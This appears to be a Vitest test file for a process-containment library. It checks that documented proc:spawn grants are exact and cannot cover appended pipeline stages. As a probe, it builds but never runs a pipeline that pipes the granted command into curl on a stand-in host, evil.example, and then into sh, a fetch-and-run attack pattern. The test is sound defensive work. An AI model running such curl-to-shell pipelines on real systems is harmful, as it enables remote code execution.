import * as Capability from "@smthrs/capability/Capability"
import * as ChildProcess from "effect/unstable/process/ChildProcess"
import { globSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs"
import { readFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { fileURLToPath } from "node:url"
import { describe, expect, it } from "vitest"
import { defaultInclude } from "vitest/config"
import * as CommandLine from "../src/CommandLine.ts"

const readDoc = (path: string): Promise<string> => readFile(new URL(`../docs/${path}`, import.meta.url), "utf8")

/**
 * Whether the runner this package installs would discover a file with this
 * name. The package declares no `test.include`, so Vitest's default governs,
 * and a filename passed on the command line only narrows what the default
 * already found.
 */
const discovers = (name: string): boolean => {
  const dir = mkdtempSync(join(tmpdir(), "kernel-docs-"))
  writeFileSync(join(dir, name), "")
  return globSync([...defaultInclude], { cwd: dir }).includes(name)
}

const docsDir = fileURLToPath(new URL("../docs/", import.meta.url))

/** Every `proc:spawn` resource a docs snippet hands a reader to copy. */
const documentedSpawnGrants = (): ReadonlyArray<{ readonly file: string; readonly resource: string }> =>
  globSync("**/*.md", { cwd: docsDir }).flatMap((file) =>
    [...readFileSync(join(docsDir, file), "utf8").matchAll(/action: "proc:spawn", resource: "([^"]*)"/g)].map(
      (match) => ({ file, resource: match[1]! })
    )
  )

/**
 * A pipeline whose first stage is the granted command and whose later stages
 * run code the grant never named, as the per-stage resources the spawner checks.
 */
const smuggled = (granted: string): ReadonlyArray<string> => {
  const [program, ...args] = granted.replaceAll("*", "").trim().split(" ")
  return CommandLine.stages(
    ChildProcess.make(program!, args).pipe(
      ChildProcess.pipeTo(ChildProcess.make("curl", ["https://evil.example"])),
      ChildProcess.pipeTo(ChildProcess.make("sh"))
    )
  ).map((stage) => CommandLine.resource(stage))
}

/** Whether one grant pattern covers every stage the spawner checks. */
const coversAll = (pattern: string, resources: ReadonlyArray<string>): boolean =>
  resources.every((resource) =>
    Capability.matches(
      new Capability.CapabilityPattern({ action: "proc:spawn", resource: pattern }),
      Capability.make("proc:spawn", resource)
    )
  )

describe("documentation contracts", () => {
  it("ships no copyable proc:spawn grant that also covers an appended pipeline", () => {
    const grants = documentedSpawnGrants()
    expect(grants.length).toBeGreaterThan(0)
    // Control: the probe does catch a grant broad enough to name every stage.
    expect(coversAll("*", smuggled("npm *"))).toBe(true)
    const overGrants = grants.filter(({ resource }) => coversAll(resource, smuggled(resource)))
    expect(overGrants).toEqual([])
  })

  it("ships only exact proc:spawn grants, as the guides tell readers to write", () => {
    // A wildcard grant such as `npm test*` also approves `npm test --watch` or
    // any other appended argument; the guides tell readers to grant exact lines.
    const grants = documentedSpawnGrants()
    expect(grants.length).toBeGreaterThan(0)
    expect(grants.filter(({ resource }) => resource.includes("*"))).toEqual([])
  })

  it.each(["docs/api.md", "docs/concepts/process-containment.md", "src/CommandLine.ts"])(
    "states that each pipeline stage needs its own grant in %s",
    (path) => {
      // The behavior the prose must describe: `git status *` covers the first
      // stage of `git status | curl x | sh` and neither stage appended to it.
      expect(coversAll("git status *", smuggled("git status *"))).toBe(false)
      const text = readFileSync(new URL(`../${path}`, import.meta.url), "utf8").replace(/\s*\n\s*(\*\s)?/g, " ")
      expect(text).not.toContain("authorizes only what it names")
      expect(text).toContain("`git status | sh` needs a grant for `sh` too")
    }
  )

  it("runs the same quickstart file it tells the reader to create", async () => {
    const quickstart = await readDoc("quickstart.md")
    const created = /Create `([^`]+)`/.exec(quickstart)?.[1]
    const executed = /pnpm vitest run (\S+)/.exec(quickstart)?.[1]
    expect(created).toBeDefined()
    expect(executed).toBe(created)
  })

  it("names a quickstart file the installed runner discovers", async () => {
    const created = /Create `([^`]+)`/.exec(await readDoc("quickstart.md"))?.[1]
    expect(created).toBeDefined()
    expect(discovers(created!)).toBe(true)
    expect(discovers("quickstart.ts")).toBe(false)
  })
})
